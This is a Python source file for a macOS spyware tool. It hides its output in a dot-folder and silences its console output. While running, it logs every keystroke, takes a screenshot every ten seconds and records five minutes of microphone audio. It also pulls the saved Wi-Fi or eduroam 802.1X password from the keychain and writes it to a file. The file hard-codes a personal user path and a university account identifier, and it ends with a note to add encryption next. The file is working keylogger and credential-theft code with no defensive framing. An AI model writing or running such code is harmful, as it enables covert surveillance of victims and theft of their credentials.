import subprocess
import logging
import time
import sounddevice as sd  # type: ignore
import soundfile as sf  # type: ignore
import threading
import os
import sys
from pynput import keyboard  # type: ignore
from PIL import ImageGrab

# Create the directory to store logs if it doesn't already exist
log_dir = "/Users/mannatvirk/.hiddenfolder"
os.makedirs(log_dir, exist_ok=True)

# Set up logging for keystrokes (keylog.txt)
keystroke_logger = logging.getLogger('keystroke_logger')
keystroke_logger.setLevel(logging.INFO)
keystroke_handler = logging.FileHandler(os.path.join(log_dir, "keylog.txt"))
keystroke_handler.setFormatter(logging.Formatter('%(message)s'))
keystroke_logger.addHandler(keystroke_handler)

# Set up logging for general operations (log.txt)
operation_logger = logging.getLogger('operation_logger')
operation_logger.setLevel(logging.INFO)
operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
operation_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
operation_logger.addHandler(operation_handler)

# SSID to account mapping for 802.1X networks
ssid_to_account = {
    "eduroam": "z5455543@ad.unsw.edu.au",
    # Add other mappings as needed
}

# Take a screenshot and log the event
def take_screenshot():
    try:
        timestamp = int(time.time())
        filename = os.path.join(log_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename, format="PNG")
        operation_logger.info(f"Screenshot taken and saved to {filename}")
    except Exception as e:
        operation_logger.info(f"Error taking screenshot: {e}")

# Continuously take screenshots at set intervals
def periodic_screenshots(interval=10):
    while True:
        take_screenshot()
        time.sleep(interval)

# Log keystrokes to keylog.txt in a continuous line
def on_press(key):
    try:
        # Log standard keys
        keystroke_logger.handlers[0].stream.write(f"{key.char}")
        keystroke_logger.handlers[0].stream.flush()
    except AttributeError:
        # Log special keys
        if key == keyboard.Key.space:
            keystroke_logger.handlers[0].stream.write(" ")
        elif key == keyboard.Key.enter:
            keystroke_logger.handlers[0].stream.write("\n")
        else:
            keystroke_logger.handlers[0].stream.write(f"[{key.name}]")
        keystroke_logger.handlers[0].stream.flush()

# Record audio and save to a file
def record_audio(filename, duration, samplerate=44100, channels=1):
    try:
        recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()  # Wait for the recording to complete
        sf.write(filename, recording, samplerate)
        operation_logger.info(f"Audio recording saved to {filename}")
    except Exception as e:
        operation_logger.info(f"Error during audio recording: {e}")

# Get the current connected Wi-Fi SSID
def get_current_wifi_ssid():
    try:
        result = subprocess.check_output(
            "networksetup -getairportnetwork en0",
            shell=True
        ).decode('utf-8').strip()
        if "Current Wi-Fi Network: " in result:
            ssid = result.split(": ")[1]
            return ssid
        else:
            logging.info("No connected Wi-Fi network found.")
            return None
    except subprocess.CalledProcessError:
        logging.info("Failed to get current Wi-Fi network.")
        return None

def get_wifi_password(ssid):
    account = ssid_to_account.get(ssid)
    if account:
        command = f'security find-generic-password -D "802.1X Password" -a "{account}" -w'
    else:
        command = f'security find-generic-password -D "AirPort network password" -s "{ssid}" -w'
    
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True)
        password = result.strip()
        with open(os.path.join(log_dir, "wifi_password.txt"), "w") as f:
            f.write(f"Password for SSID '{ssid}': {password}\n")
        logging.info(f"Password for SSID '{ssid}' saved.")
    except subprocess.CalledProcessError as e:
        logging.info(f"Could not retrieve password for SSID '{ssid}': {e}")
    except Exception as e:
        logging.info(f"Unexpected error: {e}")

if __name__ == "__main__":
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
    screenshot_thread.start()

    audio_filename = os.path.join(log_dir, "audio_rec.wav")
    recording_duration = 300  
    audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
    audio_thread.start()

    current_ssid = get_current_wifi_ssid()

    if current_ssid:
        get_wifi_password(current_ssid)
    else:
        logging.info("No connected Wi-Fi network found.")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    listener.join()

# do encryption next